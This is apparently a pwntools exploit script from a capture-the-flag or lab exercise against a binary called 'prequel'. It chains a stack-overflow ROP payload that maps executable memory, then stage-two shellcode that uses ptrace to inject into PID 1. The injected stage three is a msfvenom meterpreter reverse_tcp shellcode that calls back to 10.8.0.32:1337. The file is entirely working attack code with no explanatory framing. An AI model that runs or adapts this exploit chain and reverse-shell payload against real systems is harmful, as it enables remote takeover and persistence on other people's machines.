import math
from pwn import context, ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, p32, u32, make_packer, shellcraft, encoders, asm

context.arch='amd64'
 
# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.8.0.32 LPORT=1337 -f py
buf =  b""
buf += b"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
buf += b"\x31\xc9\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48"
buf += b"\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58"
buf += b"\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0"
buf += b"\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\x0a\x08"
buf += b"\x00\x20\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58"
buf += b"\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
buf += b"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7"
buf += b"\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79"
buf += b"\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
buf += b"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6"

LOCAL_BIN = "./prequel"
ELF_LOADED = ELF(LOCAL_BIN)

if False:
    P = process(LOCAL_BIN)
elif False:
    P = process(["strace", "--trace=101", "./prequel"])
elif False:
    P = remote('127.0.0.1', 20882)
else:
    P = remote('10.10.3.12', 20882)

stage1_offset = 72

stage2_addr = 0xdb0000
stage2_addr = 0x0
stage2_size = 0x1000000

stage3_target_pid = 1

# ROP gadgets
ROP_LOADED = ROP(ELF_LOADED)
pop_rdx_rbx = (ROP_LOADED.find_gadget(['pop rdx', 'pop rbx', 'ret']))[0]
pop_rax = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]
pop_rbx = (ROP_LOADED.find_gadget(['pop rbx', 'ret']))[0]
pop_rdi = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (ROP_LOADED.find_gadget(['pop rsi', 'ret']))[0]
pop_rcx = (ROP_LOADED.find_gadget(['pop rcx', 'ret']))[0]
syscall = (ROP_LOADED.find_gadget(['syscall']))[0] 
read_name = ELF_LOADED.symbols["read_name"]
mprotect = ELF_LOADED.symbols["mprotect"]
mmap = ELF_LOADED.symbols["mmap"]
mov_r8_rbx_sideeff_call_rax = 0x59bd4a; # mov r8, rbx; mov rcx, rbp; mov edi, 1; call rax; 
add_r9_rcx_sideeff_call_rax = 0x53849c # mov r9, rcx; push 1; push 0; call rax;
add_rsp_8 = 0x401012 # add rsp, 8; ret; 
add_rsp_24 = 0x4df8b0 # add rsp, 0x18; ret; 
mov_rdi_rax_call_rbx = 0x40b8c2 #mov rdi, rax; call rbx;
call_rax = 0x401010 # call rax; 
    

stage1 = b"A"*stage1_offset    
# set r9
stage1 += p64(pop_rax)
stage1 += p64(add_rsp_24)
stage1 += p64(pop_rcx)
stage1 += p64(0)
stage1 += p64(add_r9_rcx_sideeff_call_rax)
# set r8
stage1 += p64(pop_rax)
stage1 += p64(add_rsp_8)
stage1 += p64(pop_rbx)
stage1 += make_packer(64, sign='signed')(-1) 
stage1 += p64(mov_r8_rbx_sideeff_call_rax)
# other params, mmap
stage1 += p64(pop_rdi)
stage1 += p64(stage2_addr)
stage1 += p64(pop_rsi)
stage1 += p64(stage2_size)
stage1 += p64(pop_rdx_rbx)
stage1 += p64(0x1 | 0x2 | 0x4) # RWE
stage1 += p64(0)
stage1 += p64(pop_rcx)
stage1 += p64(0x22) # MAP_ANONYMOUS | MAP_PRIVATE   
stage1 += p64(mmap)
# move mapped address result from rax to rdi
stage1 += p64(pop_rbx)
stage1 += p64(add_rsp_8)
stage1 += p64(mov_rdi_rax_call_rbx)
# read shellcode
stage1 += p64(read_name)
# jump new shellcode
stage1 += p64(call_rax)

# stage3 payload
stage3 = b""
stage3 += asm(shellcraft.amd64.pushstr(b"Stage3 loaded!\n") + shellcraft.amd64.linux.write(1, 'rsp', 16))
stage3 += buf 
stage3 += asm(shellcraft.amd64.infloop())

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_GETREGS = 12
PTRACE_POKETEXT = 4

sc = ""
sc += shellcraft.amd64.pushstr(b"Stage2 loaded!\n")
sc += shellcraft.amd64.linux.write(1, 'rsp', 16) 
# attach to target proc
sc += shellcraft.amd64.linux.ptrace(PTRACE_ATTACH, stage3_target_pid, 0, 0) 
# wait to attach
sc += shellcraft.amd64.linux.sleep(1)
# get registers
sc += shellcraft.amd64.pushstr(b"X"*27*8, append_null=False) # sizeof(user_regs_struct)
sc += "\t"+"mov r12, rsp"+"\n"
sc += shellcraft.amd64.linux.ptrace(PTRACE_GETREGS, stage3_target_pid, 0, "r12")
# move stage3 to stack
sc += shellcraft.amd64.pushstr(stage3, append_null=False)
sc += "\t"+"mov rbx, rsp"+"\n"
# extract rip from registers
sc += shellcraft.amd64.mov('rax', "r12")
sc += "\t"+"mov rax, ds:[rax+16*8]"+"\n"
# copy stage3 to target process
l = math.ceil(len(stage3)/8)
sc += "\t"+"xor rcx,rcx"+"\n"
sc += "\t"+f"mov ecx,{l}"+"\n"
sc += "copy_loop_1:"+"\n"
sc += "\t"+"xor r10, r10"+"\n"
sc += "\t"+"mov r10d, ecx"+"\n"
sc += "\t"+"dec r10"+"\n"
sc += "\t"+"shl r10, 3"+"\n"
sc += "\t"+"mov r8, rax"+"\n"
sc += "\t"+"add r8, r10"+"\n"
sc += "\t"+"mov r9, rbx"+"\n"
sc += "\t"+"add r9, r10"+"\n"
sc += "\t"+"mov r9, [r9]"+"\n"
sc += "\t"+"push rax"+"\n"
sc += "\t"+"push rbx"+"\n"
sc += "\t"+"push rcx"+"\n"
sc += shellcraft.amd64.linux.ptrace(PTRACE_POKETEXT, stage3_target_pid, "r8", "r9")
sc += "\t"+"pop rcx"+"\n"
sc += "\t"+"pop rbx"+"\n"
sc += "\t"+"pop rax"+"\n"
sc += "\t"+"loop copy_loop_1"
# detach (and continue)
sc += shellcraft.amd64.linux.ptrace(PTRACE_DETACH, stage3_target_pid, 0, 17) # SIGCHLD
sc += shellcraft.amd64.linux.exit(0)

#sc += shellcraft.i386.breakpoint()
#print(sc)

stage2 = encoders.amd64.delta.encode(asm(sc), b"\n")

# sending payloads
P.recvuntil(b"Enter your name:")
P.sendline(stage1)
P.recvuntil(b"Enter your name:")
P.sendline(stage2)

# receive text
text = P.clean(timeout=1)
log.info(text.decode().strip(" \n\x00"))
